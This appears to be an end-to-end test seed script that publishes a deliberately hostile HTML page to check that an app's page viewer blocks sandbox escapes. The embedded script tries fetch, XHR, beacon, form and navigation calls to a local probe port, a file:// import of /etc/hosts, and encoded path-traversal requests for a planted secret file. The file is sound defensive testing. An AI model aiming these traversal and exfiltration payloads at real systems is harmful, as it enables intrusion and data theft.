// seed-page-view.ts — the hostile-page world (J-12): a throwaway data dir holding exactly one
// published page whose entry HTML tries, from script, to reach everything outside its own origin.
// Run with `npx tsx e2e/seed-page-view.ts <home> <probePort>`; prints a `SEED={json}` line with the
// data dir and the page id. The probe port is where the page aims its exfiltration attempts: the
// launcher starts a counting HTTP server there before seeding, so the port is known when the HTML
// is written and every attempt that escapes the view shows up as a counted request.
//
// Hermetic by construction: no account, no project, no repository, no secret and no agent run;
// the page is written through the app's own composition and use-case, then one extra file is
// dropped straight into the version directory — present on disk, never recorded — so the
// traversal probes have something real to fail to reach.
import { mkdirSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';

import assert from 'node:assert';

import type { Actor } from '../src/domain/index';
import { DISPATCH_MODE_KEY } from '../src/application/use-cases/settings';
import { publishPageUseCase } from '../src/application/use-cases/pages';
import { createNodeDeps } from '../src/infrastructure/compose/create-node-deps';

const OPERATOR: Actor = { kind: 'user', id: 'user-1' };

const [home, probePortText] = process.argv.slice(2);
assert(home !== undefined && probePortText !== undefined, 'usage: seed-page-view.ts <home> <probePort>');
const probePort = Number(probePortText);
assert(Number.isInteger(probePort) && probePort > 0 && probePort < 65536, 'the probe port must be a port number');

// Never <home>/.docket: with HOME=<home> the app reads that as the operator's real data dir and
// deliberately registers no dev bridge (devBridgeEnabled).
const dataDir = join(home, 'docket-data');
mkdirSync(dataDir, { recursive: true });

/** A 1x1 PNG: the control request that proves the served-request trace sees a real 200. */
const PIXEL = Buffer.from(
  'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==',
  'base64',
);

// The page: every attempt reports its outcome by loading an image from its own origin
// (`/v1/__report?<key>=<value>`), the one channel the policy leaves open. Nothing in here is
// expected to succeed; a key that says "reached" or "opened" is a failure of the view.
const HTML = `<!doctype html>
<html><head><meta charset="utf-8"><title>hostile</title></head>
<body>
<form id="f" method="post" action="http://127.0.0.1:${probePort}/form"><input name="a" value="1"></form>
<script>
(function () {
  var PROBE = 'http://127.0.0.1:${probePort}';
  var n = 0;
  function report(key, value) {
    n += 1;
    var img = new Image();
    img.src = '/v1/__report?' + encodeURIComponent(key) + '=' + encodeURIComponent(String(value)) + '&n=' + n;
  }
  function settle(key, promise) {
    try {
      promise.then(function () { report(key, 'reached'); }, function () { report(key, 'blocked'); });
    } catch (e) { report(key, 'blocked'); }
  }
  function guard(key, fn) {
    try { fn(); } catch (e) { report(key, 'blocked'); }
  }

  // Probes for the host's own objects.
  report('docket', typeof window.docket);
  report('docketDev', typeof window.docketDev);
  report('require', typeof require);
  report('process', typeof process);
  report('Buffer', typeof Buffer);

  // Network attempts, every one aimed at the counting probe (or an external name).
  guard('fetch', function () { settle('fetch', fetch('https://example.com/')); });
  guard('fetchProbe', function () { settle('fetchProbe', fetch(PROBE + '/fetch')); });
  guard('xhr', function () {
    var x = new XMLHttpRequest();
    x.onload = function () { report('xhr', 'reached'); };
    x.onerror = function () { report('xhr', 'blocked'); };
    x.open('GET', PROBE + '/xhr');
    x.send();
  });
  guard('img', function () {
    var i = new Image();
    i.onload = function () { report('img', 'reached'); };
    i.onerror = function () { report('img', 'blocked'); };
    i.src = PROBE + '/img';
  });
  guard('beacon', function () { report('beacon', navigator.sendBeacon(PROBE + '/beacon', 'x') ? 'queued' : 'refused'); });
  guard('import', function () { settle('import', import('file:///etc/hosts')); });
  guard('open', function () { report('open', window.open(PROBE + '/open') ? 'opened' : 'blocked'); });
  guard('nav', function () { location.href = PROBE + '/nav'; });
  guard('form', function () { document.getElementById('f').submit(); });

  // Storage written now and read back by the next load of the same page.
  guard('lsPrev', function () {
    var prev = localStorage.getItem('k');
    localStorage.setItem('k', 'v');
    report('lsPrev', prev === null ? 'none' : prev);
    report('lsRead', localStorage.getItem('k'));
  });
  guard('cookiePrev', function () {
    report('cookiePrev', document.cookie.indexOf('k=v') >= 0 ? 'v' : 'none');
    document.cookie = 'k=v';
  });
  guard('idbPrev', function () {
    var open = indexedDB.open('hostile', 1);
    open.onupgradeneeded = function () { open.result.createObjectStore('s'); };
    open.onerror = function () { report('idbPrev', 'error'); };
    open.onsuccess = function () {
      var db = open.result;
      var tx = db.transaction('s', 'readwrite');
      var get = tx.objectStore('s').get('k');
      get.onsuccess = function () {
        report('idbPrev', get.result === undefined ? 'none' : get.result);
        tx.objectStore('s').put('v', 'k');
      };
    };
  });

  // Path traversal and unrecorded files, as image loads: none may ever be answered 200 (the
  // served trace is the evidence); the recorded pixel is the control that must be.
  ['/v1/secret', '/v1/%73ecret', '/v1/%2e%2e%2fsecret', '/v1/..%2fsecret', '/v1/../v1/secret', '/v1/%252e%252e/secret', '/v1/a%00/secret', '/v1/a\\\\..\\\\secret', '/v2/pixel.png'].forEach(function (path, index) {
    guard('trav' + index, function () {
      var i = new Image();
      i.onload = function () { report('trav' + index, 'loaded'); };
      i.onerror = function () { report('trav' + index, 'failed'); };
      i.src = path;
    });
  });
  guard('pixel', function () {
    var i = new Image();
    i.onload = function () { report('pixel', 'loaded'); };
    i.onerror = function () { report('pixel', 'failed'); };
    i.src = '/v1/pixel.png';
  });

  // The last word, after the navigations and loads above had time to be refused.
  setTimeout(function () { report('protocol', location.protocol); report('done', 1); }, 800);
})();
</script>
</body></html>
`;

const node = createNodeDeps({
  dataDir,
  cipher: {
    isEncryptionAvailable: () => true,
    encryptString: (plain: string) => Buffer.from(plain, 'utf8'),
    decryptString: (blob: Uint8Array) => Buffer.from(blob).toString('utf8'),
  },
  transports: { forAccount: async () => undefined },
  notifier: { notify: () => undefined },
  commandEnv: {},
  clock: { now: () => 1_700_000_000_000 },
  random: (length: number) => new Uint8Array(length),
});
if (!node.ok) throw new Error(`page-view seed could not open deps: ${JSON.stringify(node.error)}`);
const deps = node.value.deps;
// The world must not depend on the host's load: pin the fixed dispatch mode.
await deps.settings.set(DISPATCH_MODE_KEY, 'fixed');

const published = await publishPageUseCase(deps, {
  title: 'Hostile page',
  kind: 'html',
  by: OPERATOR,
  entry: 'index.html',
  files: [
    { path: 'index.html', bytes: new TextEncoder().encode(HTML) },
    { path: 'pixel.png', bytes: new Uint8Array(PIXEL) },
  ],
});
assert(published.ok, `the page did not publish: ${published.ok ? '' : published.error.code}`);
const pageId = published.value.id;

// On disk in the version directory, but not a recorded file of the version.
writeFileSync(join(dataDir, 'pages', pageId, 'v1', 'secret'), 'TOP SECRET');

node.value.close();
console.log(`SEED=${JSON.stringify({ home, dataDir, pageId })}`);
